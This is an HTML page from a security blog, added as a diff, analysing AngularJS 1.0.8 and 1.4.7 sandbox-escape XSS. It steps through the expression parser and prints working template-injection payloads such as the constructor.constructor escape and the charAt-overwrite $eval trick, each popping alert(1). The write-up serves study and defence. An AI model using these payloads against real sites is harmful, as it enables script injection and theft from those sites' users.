@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+<title>
+  
+    AngularJS_XSS
+  
+</title>
+
+<meta name="description" content="AngularJS XSS">
+<meta name="keywords" content="WEB">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AngularJS_XSS">
+<meta property="og:url" content="http://spikesec.cn/2017/08/10/AngularJS-XSS/index.html">
+<meta property="og:site_name" content="Spike Security">
+<meta property="og:description" content="AngularJS XSS">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://spikesec.cn/2017/08/10/AngularJS-XSS/AngularJS-XSS/AngularJS1.jpg">
+<meta property="og:image" content="http://spikesec.cn/2017/08/10/AngularJS-XSS/AngularJS-XSS/AngularJS2.jpg">
+<meta property="og:image" content="http://spikesec.cn/2017/08/10/AngularJS-XSS/AngularJS-XSS/AngularJS3.jpg">
+<meta property="og:image" content="http://spikesec.cn/2017/08/10/AngularJS-XSS/AngularJS-XSS/AngularJS4.jpg">
+<meta property="og:image" content="http://spikesec.cn/2017/08/10/AngularJS-XSS/AngularJS-XSS/AngularJS5.jpg">
+<meta property="og:image" content="http://spikesec.cn/2017/08/10/AngularJS-XSS/AngularJS-XSS/AngularJS6.jpg">
+<meta property="og:image" content="http://spikesec.cn/2017/08/10/AngularJS-XSS/AngularJS-XSS/AngularJS7.jpg">
+<meta property="og:image" content="http://spikesec.cn/2017/08/10/AngularJS-XSS/AngularJS-XSS/AngularJS11.jpg">
+<meta property="og:image" content="http://spikesec.cn/2017/08/10/AngularJS-XSS/AngularJS-XSS/AngularJS12.jpg">
+<meta property="og:image" content="http://spikesec.cn/2017/08/10/AngularJS-XSS/AngularJS-XSS/AngularJS13.jpg">
+<meta property="og:image" content="http://spikesec.cn/2017/08/10/AngularJS-XSS/AngularJS-XSS/AngularJS14.jpg">
+<meta property="og:updated_time" content="2018-03-01T08:11:16.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="AngularJS_XSS">
+<meta name="twitter:description" content="AngularJS XSS">
+<meta name="twitter:image" content="http://spikesec.cn/2017/08/10/AngularJS-XSS/AngularJS-XSS/AngularJS1.jpg">
+
+
+  <link rel="alternative" href="/atom.xml" title="Spike Security" type="application/atom+xml">
+
+
+
+  <link rel="icon" href="/favicon.png">
+
+
+<link rel="stylesheet" href="/perfect-scrollbar/css/perfect-scrollbar.min.css">
+<link rel="stylesheet" href="/styles/main.css">
+
+
+
+
+
+
+</head>
+<body
+  
+    class="monochrome"
+  
+  >
+  <div class="mobile-header">
+  <button class="sidebar-toggle" type="button">
+    <span class="icon-bar"></span>
+    <span class="icon-bar"></span>
+    <span class="icon-bar"></span>
+  </button>
+  <a class="title" href="/">Spike Security</a>
+</div>
+
+  <div class="main-container">
+    <div class="sidebar">
+  <div class="header">
+    <h1 class="title"><a href="/">Spike Security</a></h1>
+    
+    <div class="info">
+      <div class="content">
+        
+        
+          <div class="author">Spike</div>
+        
+      </div>
+      
+        <div class="avatar">
+          
+            <a href="/about"><img src="/images/cc/avatar.jpeg"></a>
+          
+        </div>
+      
+    </div>
+  </div>
+  <div class="body">
+    
+      
+        <ul class="nav">
+          
+            
+              <li class="category-list-container">
+                <a href="javascript:;">Category</a>
+                
+              </li>
+            
+          
+            
+              <li class="tag-list-container">
+                <a href="javascript:;">Tag</a>
+                <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Security/">Security</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB/">WEB</a><span class="tag-list-count">11</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/other/">other</a><span class="tag-list-count">2</span></li></ul>
+              </li>
+            
+          
+            
+              <li class="archive-list-container">
+                <a href="javascript:;">Archive</a>
+                <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/">2018</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/">2017</a><span class="archive-list-count">10</span></li></ul>
+              </li>
+            
+          
+        </ul>
+      
+        <ul class="nav">
+          
+            
+              <li>
+                <a href="/" title="Homepage">Homepage</a>
+              </li>
+            
+          
+            
+              <li>
+                <a href="/archives" title="By Year">By Year</a>
+              </li>
+            
+          
+        </ul>
+      
+        <ul class="nav">
+          
+            
+              <li>
+                <a href="http://weibo.com/spikex" title="Weibo" target="_blank" rel="noopener">Weibo</a>
+              </li>
+            
+          
+            
+              <li>
+                <a href="https://github.com/SpikeI" title="Github" target="_blank" rel="noopener">Github</a>
+              </li>
+            
+          
+            
+              <li>
+                <a href="/atom.xml" title="RSS">RSS</a>
+              </li>
+            
+          
+        </ul>
+      
+    
+  </div>
+</div>
+
+    <div class="main-content">
+      
+        <div style="max-width: 1000px">
+      
+          <article id="post-AngularJS-XSS" class="article article-type-post">
+  
+    <h1 class="article-header">
+      AngularJS_XSS
+    </h1>
+  
+  
+
+  <div class="article-info">
+    <span class="article-date">
+  2017-08-10
+</span>
+
+    
+
+    
+	<span class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WEB/">WEB</a></li></ul>
+	</span>
+
+
+  </div>
+  <div class="article-entry">
+    <h2 id="AngularJS-XSS"><a href="#AngularJS-XSS" class="headerlink" title="AngularJS XSS"></a>AngularJS XSS</h2><a id="more"></a>
+<p>​    AngularJS是一个比较流行的前端架构，但在1.0.8，1.4.7，都存在XSS注入点。其罪魁祸首是AngularJS在这几个版本中启用了沙箱机制，在之后的几个版本后将沙箱机制废除，这个漏洞也就不复存在了。</p>
+<p>​    AngularJS的基本语法是这样滴。首先通过ng-directives扩展了HTML，即进行作用于的声明或者类及参数的绑定：<code>ng-app</code>,<code>ng-model</code>,<code>ng-bind</code>。在<code>ng-app</code>下都可以使用AngularJS的表达式执行AngularJS的语句，表达式如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; expression &#125;&#125;</span><br><span class="line">&#123;&#123; 1+1 &#125;&#125; =&gt; 2</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; firstName &#125;&#125; =&gt; John</span><br><span class="line">&#123;&#123; firstName+&quot;&quot;+lastName &#125;&#125; =&gt; John Doe</span><br><span class="line">&lt;script&gt;</span><br><span class="line">var app = angular.module(&apos;myApp&apos;, []);</span><br><span class="line">app.controller(&apos;myCtrl&apos;, function($scope) &#123;</span><br><span class="line">    $scope.firstName= &quot;John&quot;;</span><br><span class="line">    $scope.lastName= &quot;Doe&quot;;</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; functionxxx() &#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>​    下面就来简单分析下AngularJS的注入点：</p>
+<h3 id="AngularJS-1-0-8"><a href="#AngularJS-1-0-8" class="headerlink" title="AngularJS 1.0.8"></a>AngularJS 1.0.8</h3><p>​    首先观察代码6720-6722行：</p>
+<p><img src="AngularJS-XSS\AngularJS1.jpg" alt="AngularJS1"></p>
+<p>在这过程中定义了<code>fn</code>,查看<code>fn</code>的代码，我们在调试的时候输入是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; alert(1) &#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>此时<code>fn</code>中的代码是查看k或s中是否有alert函数，如果有的话那么就调用这个函数。</p>
+<p><img src="AngularJS-XSS\AngularJS2.jpg" alt="AngularJS2"></p>
+<p>继续执行跳到6538行：</p>
+<p><img src="AngularJS-XSS\AngularJS3.jpg" alt="AngularJS3"></p>
+<p>这里调用了<code>fn</code>，可以看到，这里如果<code>fn</code> return的值为<code>false</code>则<code>fnptr</code>被赋值为<code>noop</code>即空。此时<code>scope</code>表示当前的<code>angular</code>的<code>scope</code>对象，<code>locals</code>为空（为何为空没有细看），所以我们的目的是通过这个<code>fn</code>函数调用<code>scope</code>的一个成员函数得到我们想要的函数。</p>
+<p>来看<code>scope</code>对象：</p>
+<p><img src="AngularJS-XSS\AngularJS4.jpg" alt="AngularJS4"></p>
+<p>对象里面没有什么可以直接引用的函数，但它有一个成员是<code>constructor</code>：</p>
+<p><img src="AngularJS-XSS\AngularJS5.jpg" alt="AngularJS5"></p>
+<p><code>scope</code>的constructor是<code>Object</code>，<code>Object</code>的Constructor是<code>Function</code>。<code>Function</code>对象可以使用很多的函数：</p>
+<p><img src="AngularJS-XSS\AngularJS6.jpg" alt="AngularJS6"></p>
+<p>调用<code>Function</code>执行函数，成功逃逸沙箱：</p>
+<p><img src="AngularJS-XSS\AngularJS7.jpg" alt="AngularJS7"></p>
+<p>最终payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; constructor.constructor(&apos;alert(1)&apos;)() &#125;&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="AngularJS-1-4-7"><a href="#AngularJS-1-4-7" class="headerlink" title="AngularJS 1.4.7"></a>AngularJS 1.4.7</h3><p>当我们使用，1.0.8版本的payload时出现了如下报错，Angular修补了相关漏洞，加入了<code>ensureSafeObject</code>函数来：</p>
+<p><img src="AngularJS-XSS\AngularJS11.jpg" alt="AngularJS11"></p>
+<p>他会判断是否调用了<code>Function</code>对象，如果一个对象的constructor是它本身的话就会被拦截：</p>
+<p><img src="AngularJS-XSS\AngularJS12.jpg" alt="AngularJS12"></p>
+<p>​    这个版本下的payload是：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;a&apos;.constructor.prototype.charat=&apos;b&apos;.concat; $eval(&apos;x=1&#125; &#125; &#125;;alert(1)//&apos;); &#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>​    这个payload分为两个部分，第一个部分覆盖<code>string</code>对象的<code>charat</code>方法，将<code>charat</code>方法变为<code>join</code>方法，，在执行第二句的过程中Angular的解析器会使用<code>charat</code>来处理<code>$eval</code>的参数，此时变为<code>join</code>即将其链接到了字符串后面，从而产生漏洞执行的机会，下面来具体分析：</p>
+<p>​    首先我们来看，AngularJS的解析过程，当拿到被两个大括号包裹的字符串时，要经过一个lexer，这个lexer是构建抽象语法树(AST)的一个环节，他是讲一个字符串转换成一个token序列，他是编译器的一个环节。Angular将其特殊格式的文本转换成普通Javascript的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">lex: function(text) &#123;</span><br><span class="line">    this.text = text;</span><br><span class="line">    this.index = 0;</span><br><span class="line">    this.tokens = [];</span><br><span class="line"></span><br><span class="line">    while (this.index &lt; this.text.length) &#123;</span><br><span class="line">      var ch = this.text.charAt(this.index);</span><br><span class="line">      if (ch === &apos;&quot;&apos; || ch === &quot;&apos;&quot;) &#123;</span><br><span class="line">        this.readString(ch);</span><br><span class="line">      &#125; else if (this.isNumber(ch) || ch === &apos;.&apos; &amp;&amp; this.isNumber(this.peek())) &#123;</span><br><span class="line">        this.readNumber();</span><br><span class="line">      &#125; else if (this.isIdent(ch)) &#123;</span><br><span class="line">        this.readIdent();</span><br><span class="line">      &#125; else if (this.is(ch, &apos;()&#123;&#125;[].,;:?&apos;)) &#123;</span><br><span class="line">        this.tokens.push(&#123;index: this.index, text: ch&#125;);</span><br><span class="line">        this.index++;</span><br><span class="line">      &#125; else if (this.isWhitespace(ch)) &#123;</span><br><span class="line">        this.index++;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        var ch2 = ch + this.peek();</span><br><span class="line">        var ch3 = ch2 + this.peek(2);</span><br><span class="line">        var op1 = OPERATORS[ch];</span><br><span class="line">        var op2 = OPERATORS[ch2];</span><br><span class="line">        var op3 = OPERATORS[ch3];</span><br><span class="line">        if (op1 || op2 || op3) &#123;</span><br><span class="line">          var token = op3 ? ch3 : (op2 ? ch2 : ch);</span><br><span class="line">          this.tokens.push(&#123;index: this.index, text: token, operator: true&#125;);</span><br><span class="line">          this.index += token.length;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">          this.throwError(&apos;Unexpected next character &apos;, this.index, this.index + 1);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return this.tokens;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>​    它通过一个字符一个字符的判断，最终得到token序列，比如我们输入payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&apos;a&apos;.constructor.prototype.charAt=[].join;$eval(&apos;x=1&#125; &#125; &#125;;alert(1)//&apos;);&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>​    被解析成下面这样的序列：</p>
+<p><img src="AngularJS-XSS\AngularJS13.jpg" alt="AngularJS13"></p>
+<p>在AST的结尾我们下一个断点，最终的到的fnstring，美化后：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">var fn = function(s, l, a, i) &#123;</span><br><span class="line">		var v0, v1, v2, v3, v4, v5, v6, v7, v8, v9 = l &amp;&amp; (&apos;\u0024eval&apos; in l),</span><br><span class="line">			v10;</span><br><span class="line">		v4 = &apos;a&apos;;</span><br><span class="line">		if (v4 != null) &#123;</span><br><span class="line">			if (!(v4.constructor)) &#123;</span><br><span class="line">				v4.constructor = &#123;&#125;;</span><br><span class="line">			&#125;</span><br><span class="line">			v3 = ensureSafeObject(v4.constructor, text);</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			v3 = undefined;</span><br><span class="line">		&#125;</span><br><span class="line">		if (v3 != null) &#123;</span><br><span class="line">			if (!(v3.prototype)) &#123;</span><br><span class="line">				v3.prototype = &#123;&#125;;</span><br><span class="line">			&#125;</span><br><span class="line">			v1 = v3.prototype;</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			v1 = undefined;</span><br><span class="line">		&#125;</span><br><span class="line">		if (v1 != null) &#123;</span><br><span class="line">			v2 = v1.charAt;</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			v2 = undefined;</span><br><span class="line">		&#125;</span><br><span class="line">		if (v1 != null) &#123;</span><br><span class="line">			v5 = [];</span><br><span class="line">			if (v5 != null) &#123;</span><br><span class="line">				v0 = v5.join;</span><br><span class="line">			&#125; else &#123;</span><br><span class="line">				v0 = undefined;</span><br><span class="line">			&#125;</span><br><span class="line">			ensureSafeObject(v1.charAt, text);</span><br><span class="line">			ensureSafeAssignContext(v1, text);</span><br><span class="line">		&#125;</span><br><span class="line">		v1.charAt = v0;  </span><br><span class="line">		v8 = v9 ? l : s;</span><br><span class="line">		if (!(v9)) &#123;</span><br><span class="line">			if (s) &#123;</span><br><span class="line">				v7 = s.$eval;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			v7 = l.$eval;</span><br><span class="line">		&#125;</span><br><span class="line">		if (v7 != null) &#123;</span><br><span class="line">			ensureSafeFunction(v7, text);</span><br><span class="line">			v10 = &apos;x\u003d1\u007d \u007d \u007d\u003balert\u00281\u0029\u002f\u002f&apos;;</span><br><span class="line">			ensureSafeObject(v8, text);</span><br><span class="line">			v6 = ensureSafeObject(v8.$eval(ensureSafeObject(&apos;x\u003d1\u007d \u007d \u007d\u003balert\u00281\u0029\u002f\u002f&apos;, text)), text);</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			v6 = undefined;</span><br><span class="line">		&#125;</span><br><span class="line">		return v6;</span><br><span class="line">	&#125;;</span><br></pre></td></tr></table></figure>
+<p>​    此时charAt不是Fucntion，所以会过ensureSafeObject，这段代码将String的charAt进行赋值并且，执行了\$eval，当执行\$eval的时候会重新解析里面的字符串，即又重新回到了AST中的lexer中重新构建抽象语法树。我们回到之前的地方，重新解析eval中将要执行的字符串：</p>
+<p><img src="AngularJS-XSS\AngularJS14.jpg" alt="AngularJS14"></p>
+<p>​    此时的charAt函数已经被替换，被赋值后的ch不是字符而是整个字符串:<code>x=1} } };alert(1)//</code>，并且会从isIdent判断中跳出，即将其整个当作了标识符。</p>
+<p>​    最终，我们得到了生成fn的fnstring，美化过后如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var fn = function(s, l, a, i) &#123;</span><br><span class="line">		var v5, v6 = l &amp;&amp; (&apos;x\u003d1\u007d \u007d \u007d\u003balert\u00281\u0029\u002f\u002f&apos; in l);</span><br><span class="line">		if (!(v6)) &#123;</span><br><span class="line">			if (s) &#123;</span><br><span class="line">				v5 = s.x = 1</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;;</span><br><span class="line">alert(1) //;&#125;&#125;else&#123;v5=l.x=1&#125; &#125; &#125;;alert(1)//;&#125;return v5;&#125;;fn.assign=function(s,v,l)&#123;var v0,v1,v2,v3,v4=l&amp;&amp;(&apos;x\u003d1\u007d \u007d \u007d\u003balert\u00281\u0029\u002f\u002f&apos; in l);v3=v4?l:s;if(!(v4))&#123;if(s)&#123;v2=s.x=1&#125; &#125; &#125;;alert(1)//;&#125;&#125;else&#123;v2=l.x=1&#125; &#125; &#125;;alert(1)//;&#125;if(v3!=null)&#123;v1=v;ensureSafeObject(v3.x=1&#125; &#125; &#125;;alert(1)//,text);ensureSafeAssignContext(v3,text);v0=v3.x=1&#125; &#125; &#125;;alert(1)//=v1;&#125;return v0;&#125;</span><br></pre></td></tr></table></figure>
+<p>​    可见我们的输入的<code>x=1}}};alert(1) //</code>被拼入了代码中，且前面的大括号刚好被闭合，执行<code>alert</code>后后面的代码被注释。</p>
+<p>参考：</p>
+<p><a href="http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html" target="_blank" rel="noopener">http://blog.portswigger.net/2016/01/xss-without-html-client-side-template.html</a></p>
+<p><a href="https://www.youtube.com/watch?v=Hium4FVAR5A#t=17.303828" target="_blank" rel="noopener">https://www.youtube.com/watch?v=Hium4FVAR5A#t=17.303828</a></p>
+
+  </div>
+  <footer class="article-footer">
+    
+  <div class="cc">
+    <a href="http://creativecommons.org/licenses/by-sa/4.0/deed.en" target="_blank" title="Attribution-ShareAlike">
+      <img src="/images/cc/cc.png">
+      
+          <img src="/images/cc/by.png">
+        
+          <img src="/images/cc/sa.png">
+      
+      <span>
+        This work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License.
+      </span>
+    </a>
+  </div>
+
+
+    
+
+  </footer>
+</article>
+
+
+
+
+
+
+
+          <div class="main-footer">
+  
+    © 2018 Spike Security - Powered by <a href="http://hexo.io" target="_blank">Hexo</a> - Theme <a href="https://github.com/denjones/hexo-theme-chan" target="_blank">Chan</a>
+  
+</div>
+
+      
+        </div>
+      
+    </div>
+  </div>
+  <script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+
+  <link rel="stylesheet" href="/PhotoSwipe/photoswipe.css">
+  <link rel="stylesheet" href="/PhotoSwipe/default-skin/default-skin.css">
+
+  <!-- Root element of PhotoSwipe. Must have class pswp. -->
+  <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe.
+             It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+      <!-- Container that holds slides.
+                PhotoSwipe keeps only 3 of them in the DOM to save memory.
+                Don't modify these 3 pswp__item elements, data is added later on. -->
+      <div class="pswp__container">
+        <div class="pswp__item"></div>
+        <div class="pswp__item"></div>
+        <div class="pswp__item"></div>
+      </div>
+
+      <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+      <div class="pswp__ui pswp__ui--hidden">
+
+        <div class="pswp__top-bar">
+
+          <!--  Controls are self-explanatory. Order can be changed. -->
+
+          <div class="pswp__counter"></div>
+
+          <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+          <button class="pswp__button pswp__button--share" title="Share"></button>
+
+          <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+          <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+          <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+          <!-- element will get class pswp__preloader--active when preloader is running -->
+          <div class="pswp__preloader">
+            <div class="pswp__preloader__icn">
+              <div class="pswp__preloader__cut">
+                <div class="pswp__preloader__donut"></div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+          <div class="pswp__share-tooltip"></div>
+        </div>
+
+        <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
+
+        <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>
+
+        <div class="pswp__caption">
+          <div class="pswp__caption__center"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="/PhotoSwipe/photoswipe.js"></script>
+  <script src="/PhotoSwipe/photoswipe-ui-default.js"></script>
+
+
+<script src="/perfect-scrollbar/js/min/perfect-scrollbar.min.js"></script>
+<script src="/scripts/main.js"></script>
+
+</body>
+</html>
